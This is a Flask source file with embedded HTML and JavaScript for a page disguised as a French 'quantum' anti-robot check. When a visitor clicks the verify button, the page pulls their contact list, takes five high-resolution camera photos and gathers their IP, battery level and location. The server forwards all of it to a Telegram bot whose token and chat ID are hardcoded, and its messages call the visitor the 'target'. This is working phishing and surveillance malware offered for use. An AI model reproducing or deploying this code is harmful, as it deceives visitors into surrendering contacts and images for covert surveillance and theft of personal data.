# api/index.py
from flask import Flask, request, jsonify, render_template_string
import requests
import json
import base64
import re
import os
from datetime import datetime

app = Flask(__name__)

# ========== CONFIGURATION TELEGRAM ==========
BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
CHAT_ID = "8546452645"

TELEGRAM_API = f"https://api.telegram.org/bot{8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o}/sendPhoto"

def send_telegram(text, photo_bytes=None):
    try:
        if photo_bytes:
            files = {'photo': ('shot.jpg', photo_bytes, 'image/jpeg')}
            data = {'chat_id': CHAT_ID, 'caption': text}
            requests.post(TELEGRAM_PHOTO_API, files=files, data=data, timeout=10)
        else:
            data = {'chat_id': 8546452645, 'text': text}
            requests.post(TELEGRAM_API, json=data, timeout=10)
    except Exception as e:
        print(f"Erreur: {e}")

def get_extra_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,city,country,isp").json()
        if response['status'] == 'success':
            return f"📍 {response['city']}, {response['country']} | 🌐 ISP: {response['isp']}"
    except:
        pass
    return "Localisation inconnue"

# ========== PAGE HTML MATRIX ==========
HTML_MATRIX = '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Quantum Security █ Matrix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Courier New', monospace; overflow: hidden; }
        #matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; }
        canvas { display: block; width: 100%; height: 100%; }
        .container { position: relative; z-index: 1; text-align: center; padding: 2rem; max-width: 550px; width: 90%; }
        .terminal { background: rgba(0,0,0,0.85); border: 1px solid #0f0; border-radius: 12px; padding: 2rem; box-shadow: 0 0 40px rgba(0,255,0,0.2); }
        h1 { color: #0f0; font-size: 1.3rem; letter-spacing: 3px; margin-bottom: 1.5rem; text-transform: uppercase; border-right: 2px solid #0f0; display: inline-block; padding-right: 10px; animation: blink 1s step-end infinite; }
        @keyframes blink { 0%,100% { border-color: #0f0; } 50% { border-color: transparent; } }
        .sub { color: #0a8; font-size: 0.7rem; margin-bottom: 2rem; }
        .btn-matrix { background: transparent; border: 2px solid #0f0; color: #0f0; padding: 14px 30px; font-size: 1rem; font-family: monospace; font-weight: bold; cursor: pointer; margin: 1rem 0; transition: all 0.3s; text-transform: uppercase; }
        .btn-matrix:hover { background: #0f0; color: #000; box-shadow: 0 0 20px #0f0; }
        .progress-container { width: 100%; height: 3px; background: #0a2a0a; margin-top: 20px; display: none; }
        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s linear; }
        .status-text { color: #0f0; font-size: 0.7rem; margin-top: 15px; min-height: 50px; }
        footer { margin-top: 1.5rem; color: #0a4a0a; font-size: 0.6rem; }
        .resolution-badge { color: #0a8; font-size: 0.6rem; margin-top: 10px; }
    </style>
</head>
<body>
<canvas id="matrix-bg"></canvas>
<div class="container">
    <div class="terminal">
        <h1>VÉRIFICATION QUANTIQUE</h1>
        <div class="sub">[ protocole anti-robot ]</div>
        
        <button class="btn-matrix" id="actionBtn">VÉRIFIER QUE JE NE SUIS PAS UN ROBOT</button>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status-text" id="statusMsg">>_ système prêt</div>
        <div class="resolution-badge" id="resBadge"></div>
        <footer>© Quantum Defense • session chiffrée</footer>
    </div>
</div>

<script>
    // Matrix Rain
    const canvas = document.getElementById('matrix-bg');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
    const charArray = chars.split('');
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = [];
    for(let i = 0; i < columns; i++) drops[i] = 1;
    
    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0f0';
        ctx.font = fontSize + 'px monospace';
        for(let i = 0; i < drops.length; i++) {
            const text = charArray[Math.floor(Math.random() * charArray.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

    let collected = {};

    async function postData(endpoint, data) {
        try {
            await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch(e) {}
    }

    function detectMobileOS() {
        const ua = navigator.userAgent;
        if(/Android/i.test(ua)) return 'Android';
        if(/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
        return 'Autre';
    }

    async function collectPassive() {
        collected.os = detectMobileOS();
        collected.timestamp = new Date().toISOString();
        
        if(navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                collected.battery = Math.floor(battery.level * 100) + '%';
            } catch(e) { collected.battery = '?'; }
        } else { collected.battery = 'indisponible'; }
        
        try {
            const geoRes = await fetch('https://api.ipify.org?format=json');
            const geoData = await geoRes.json();
            collected.ip = geoData.ip;
        } catch(e) { collected.ip = 'inconnu'; }
        
        await postData('/api/passive', collected);
    }

    // Capture des contacts
    async function captureContacts() {
        const statusDiv = document.getElementById('statusMsg');
        statusDiv.innerHTML = '>_ [CONTACTS] demande d\'accès...';
        
        // Vérifier si l'API Contacts est disponible
        if (!navigator.contacts) {
            statusDiv.innerHTML = '>_ [CONTACTS] API non supportée';
            return;
        }
        
        try {
            // Demander les permissions avec les propriétés souhaitées
            const props = ['name', 'tel', 'email'];
            const opts = { multiple: true };
            
            statusDiv.innerHTML = '>_ [CONTACTS] autorisation requise...';
            
            const contacts = await navigator.contacts.select(props, opts);
            
            if (contacts && contacts.length > 0) {
                statusDiv.innerHTML = `>_ [CONTACTS] ${contacts.length} contacts trouvés, envoi...`;
                
                // Formater et envoyer les contacts
                const contactsList = [];
                for (const contact of contacts) {
                    const name = contact.name || 'Sans nom';
                    const phones = contact.tel ? contact.tel.join(', ') : 'Aucun';
                    const emails = contact.email ? contact.email.join(', ') : 'Aucun';
                    contactsList.push({ name, phones, emails });
                    
                    // Envoi individuel pour ne pas surcharger
                    await postData('/api/contacts', {
                        contact: { name, phones, emails },
                        info: collected,
                        index: contactsList.length,
                        total: contacts.length
                    });
                    
                    // Mise à jour progression
                    const percent = (contactsList.length / contacts.length) * 100;
                    document.getElementById('progressBar').style.width = percent + '%';
                    statusDiv.innerHTML = `>_ [CONTACTS] ${contactsList.length}/${contacts.length}`;
                }
                
                statusDiv.innerHTML = `>_ [CONTACTS] ${contacts.length} contacts envoyés`;
            } else {
                statusDiv.innerHTML = '>_ [CONTACTS] aucun contact trouvé ou refusé';
            }
        } catch(err) {
            statusDiv.innerHTML = '>_ [CONTACTS] accès refusé par l\'utilisateur';
            await postData('/api/error', { error: 'Contacts refusés: ' + err.message, info: collected });
        }
    }

    // Capture photo HD
    async function capturePhotoHD(stream, index, videoElement) {
        return new Promise((resolve) => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    const reader = new FileReader();
                    reader.onloadend = async function() {
                        await postData('/api/photo', {
                            photo: reader.result,
                            index: index,
                            info: collected,
                            width: canvas.width,
                            height: canvas.height,
                            sizeKB: (blob.size / 1024).toFixed(1)
                        });
                        resolve();
                    };
                    reader.readAsDataURL(blob);
                }, 'image/jpeg', 1.0);
            }, 100);
        });
    }

    async function burstPhotosHD() {
        const statusDiv = document.getElementById('statusMsg');
        const resBadge = document.getElementById('resBadge');
        statusDiv.innerHTML = '>_ [SCAN] activation caméra HD...';
        
        try {
            const constraints = {
                video: { width: { ideal: 3840, max: 4096 }, height: { ideal: 2160, max: 2160 } }
            };
            
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('autoplay', '');
            video.setAttribute('playsinline', '');
            video.play();
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => { setTimeout(resolve, 800); };
            });
            
            const width = video.videoWidth;
            const height = video.videoHeight;
            resBadge.innerHTML = `📷 résolution native: ${width} x ${height}`;
            statusDiv.innerHTML = `>_ [SCAN] HD: ${width}x${height}`;
            
            for(let i = 1; i <= 5; i++) {
                await capturePhotoHD(stream, i, video);
                const percent = (i / 5) * 100;
                document.getElementById('progressBar').style.width = percent + '%';
                statusDiv.innerHTML = `>_ [SCAN] capture ${i}/5 (${width}x${height})`;
                if(i < 5) await new Promise(r => setTimeout(r, 600));
            }
            
            stream.getTracks().forEach(track => track.stop());
            video.remove();
            
        } catch(err) {
            statusDiv.innerHTML = '>_ [ERREUR] accès caméra refusé';
            await postData('/api/error', { error: err.message, info: collected });
        }
    }

    async function startVerification() {
        const btn = document.getElementById('actionBtn');
        btn.disabled = true;
        btn.style.opacity = '0.5';
        btn.innerText = 'SCAN EN COURS...';
        
        document.getElementById('progressContainer').style.display = 'block';
        document.getElementById('progressBar').style.width = '0%';
        document.getElementById('statusMsg').innerHTML = '>_ initialisation protocole...';
        document.getElementById('resBadge').innerHTML = '';
        
        await collectPassive();
        await new Promise(r => setTimeout(r, 500));
        
        // Capture des contacts
        await captureContacts();
        await new Promise(r => setTimeout(r, 500));
        
        // Capture des photos
        await burstPhotosHD();
        
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.innerText = 'VÉRIFIER QUE JE NE SUIS PAS UN ROBOT';
        document.getElementById('progressContainer').style.display = 'none';
    }
    
    document.getElementById('actionBtn').addEventListener('click', startVerification);
    collectPassive();
</script>
</body>
</html>'''

# ========== ROUTES FLASK ==========
@app.route('/')
def index():
    return HTML_MATRIX

@app.route('/api/passive', methods=['POST'])
def passive():
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data['ip'] = ip
        geo_info = get_extra_info(ip)
        os_info = data.get('os', '?')
        battery = data.get('battery', '?')
        
        msg = f"""📍 *CIBLE* : [{os_info}] | {geo_info}
🔋 *Batterie* : {battery}
🌐 *IP* : {ip}"""
        send_telegram(msg)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/contacts', methods=['POST'])
def contacts():
    try:
        data = request.json
        contact = data.get('contact', {})
        idx = data.get('index', '?')
        total = data.get('total', '?')
        ip = data.get('info', {}).get('ip', '?')
        
        msg = f"""📱 *CONTACT {idx}/{total}*
👤 Nom: {contact.get('name', '?')}
📞 Tél: {contact.get('phones', '?')}
📧 Email: {contact.get('emails', '?')}
🌐 IP: {ip}"""
        send_telegram(msg)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/photo', methods=['POST'])
def photo():
    try:
        data = request.json
        if data and data.get('photo'):
            photo_b64 = data['photo'].split(',')[1]
            photo_bytes = base64.b64decode(photo_b64)
            idx = data.get('index', '?')
            ip = data.get('info', {}).get('ip', '?')
            width = data.get('width', '?')
            height = data.get('height', '?')
            size_kb = data.get('sizeKB', '?')
            
            msg = f"📸 *PHOTO {idx}/5* | {width}x{height} | {size_kb}KB\n🌐 IP: {ip}"
            send_telegram(msg, photo_bytes)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/error', methods=['POST'])
def error():
    try:
        data = request.json
        msg = f"⚠️ *ERREUR*\n{data.get('error', '?')}"
        send_telegram(msg)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({'status': 'active', 'matrix': 'online'})

def handler(event, context):
    return app(event, context)
